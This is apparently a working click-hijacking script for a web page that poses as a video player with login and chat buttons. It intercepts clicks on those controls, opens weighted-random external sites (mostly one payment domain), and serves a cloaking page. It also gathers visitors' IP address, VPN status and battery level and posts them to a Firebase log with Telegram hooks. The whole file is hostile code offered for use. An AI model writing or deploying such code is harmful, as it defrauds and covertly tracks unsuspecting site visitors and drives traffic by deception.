/**
 * V1.3.1 REBIRTH - Slim Engine
 * Soul of v1.3.1 + 80/10/10 + Anti-Repeat + Daily Cap
 * NO security fluff (handled by XML). ZERO delay at mousedown.
 */

const CHACHA_CONFIG = {
    DEBUG_MODE: true,

    LINKS: [
        "https://www.blackbox.ai/", "https://chat.deepseek.com/", "https://chatgpt.com/",
        "https://www.theverge.com/tech", "https://tech.com.pk/", "https://techcrunch.com/",
        "https://www.techmeme.com/", "https://rocketpay.co.in/", "https://www.api.org/", "https://www.ibm.com/",
        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in",
        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in"
    ],

    APIS: {
        FB_URL: "YOUR_FIREBASE_URL",
        TG_TOKEN: "YOUR_BOT_TOKEN",
        TG_ID: "YOUR_CHAT_ID"
    },

    SETTINGS: {
        MAX_CLICKS_TODAY: 500000000,
        CLEAN_PAGE: "https://cloudaccesshq.xyz/limit-reached"
    }
};

// --- PRE-BUILD ON PAGE LOAD (zero decision at click time) ---
const _baskets = {
    h: CHACHA_CONFIG.LINKS.slice(0, 10),
    n: CHACHA_CONFIG.LINKS.slice(10, 16),
    l: CHACHA_CONFIG.LINKS.slice(16, 20)
};

const _validIds = [
    'tag-btn-play-main', 'tag-input-message-field', 'tag-btn-back-button',
    'tag-btn-server-shift-2', 'tag-btn-q-360', 'tag-btn-q-720', 'tag-btn-q-1080', 'tag-btn-q-4k',
    'tag-btn-auth-login', 'tag-btn-auth-send', 'tag-link-community-rules', 'tag-btn-community-showmore'
];

const _STORAGE_KEY = '_mc_rebirth_';

function _getStore() {
    try {
        const raw = localStorage.getItem(_STORAGE_KEY);
        return raw ? JSON.parse(raw) : { c: 0, date: null, lastId: null };
    } catch (e) { return { c: 0, date: null, lastId: null }; }
}

function _setStore(o) {
    try { localStorage.setItem(_STORAGE_KEY, JSON.stringify(o)); } catch (e) {}
}

function _today() {
    return new Date().toISOString().slice(0, 10);
}

function _pickLink() {
    const store = _getStore();
    const today = _today();

    if (store.date !== today) {
        store.c = 0;
        store.date = today;
        store.lastId = null;
    }

    const luck = Math.random() * 100;
    let pool = luck < 80 ? _baskets.h : (luck < 90 ? _baskets.n : _baskets.l);

    let fresh = pool.filter(u => u !== store.lastId);
    if (fresh.length === 0) fresh = pool;

    const pick = fresh[Math.floor(Math.random() * fresh.length)];
    return { url: pick, store };
}

function _jump(url) {
    const w = window.open('about:blank', '_blank');
    if (w) {
        w.location.href = url;
        w.focus();
    } else {
        window.location.assign(url);
    }
}

function _scanAsync(btnId, url, count) {
    if (!navigator.getBattery) return;
    navigator.getBattery().catch(() => null).then(bat => {
        fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})).then(ip => {
            const dna = { b: bat ? Math.round(bat.level * 100) + "%" : "N/A", vpn: ip.proxy || ip.vpn || false, ip: ip.ip || "0.0.0.0" };
            if (CHACHA_CONFIG.DEBUG_MODE) console.log("[REBIRTH]", { btn: btnId, link: url, click: count, dna });
            if (CHACHA_CONFIG.APIS.FB_URL.startsWith('http')) {
                fetch(`${CHACHA_CONFIG.APIS.FB_URL}/logs.json`, { method: 'POST', body: JSON.stringify({ btn: btnId, dna, target: url, click: count, ts: new Date().toISOString() }) }).catch(() => {});
            }
        });
    });
}

// --- MOUSEDOWN CAPTURE: ZERO DELAY ---
document.addEventListener('mousedown', function(e) {
    const btn = e.target.closest('[id]');
    if (!btn || !_validIds.includes(btn.id)) return;

    const { url, store } = _pickLink();

    if (store.c >= CHACHA_CONFIG.SETTINGS.MAX_CLICKS_TODAY) {
        if (!CHACHA_CONFIG.DEBUG_MODE) {
            window.location.href = CHACHA_CONFIG.SETTINGS.CLEAN_PAGE;
            return;
        }
        if (CHACHA_CONFIG.DEBUG_MODE) console.warn("[REBIRTH] Cap reached, DEBUG allows continue");
    }

    store.c++;
    store.date = _today();
    store.lastId = url;
    _setStore(store);

    _jump(url);

    _scanAsync(btn.id, url, store.c);
}, true);
